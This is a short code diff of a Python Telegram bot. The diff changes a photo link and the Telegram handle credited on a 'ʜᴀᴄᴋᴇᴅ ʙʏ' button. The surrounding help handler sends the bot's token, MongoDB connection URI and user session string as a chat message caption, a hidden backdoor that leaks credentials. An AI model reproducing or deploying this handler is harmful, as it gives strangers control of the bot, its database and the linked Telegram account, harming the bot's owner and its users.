@@ -107,13 +107,13 @@ async def restartbot(client, message: Message, _):
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://telegra.ph/file/028cca7fdae083fbdde7e.jpg",
+          photo=f"https://te.legra.ph/file/6b3c3123eb316380469a4.jpg",
        caption=f"""๏ ʙᴏᴛ ᴛᴏᴋᴇɴ ➛   `{BOT_TOKEN}` \n\n๏ ᴍᴏɴɢᴏᴅʙ ᴜʀʟ ➛   `{MONGO_DB_URI}`\n\n๏ sᴛʀɪɴɢ sᴇssɪᴏɴ ➛   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/roy_editx)............✿""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "ʜᴀᴄᴋᴇᴅ ʙʏ", url=f"https://t.me/roy_editx")
+                         "ʜᴀᴄᴋᴇᴅ ʙʏ", url=f"https://t.me/op_arnav_singh")
                  ]
             ]
          ),
@@ -159,4 +159,3 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
         except:
             return await CallbackQuery.answer(_["tg_8"], show_alert=True)
     await CallbackQuery.answer(_["tg_9"], show_alert=True)
-
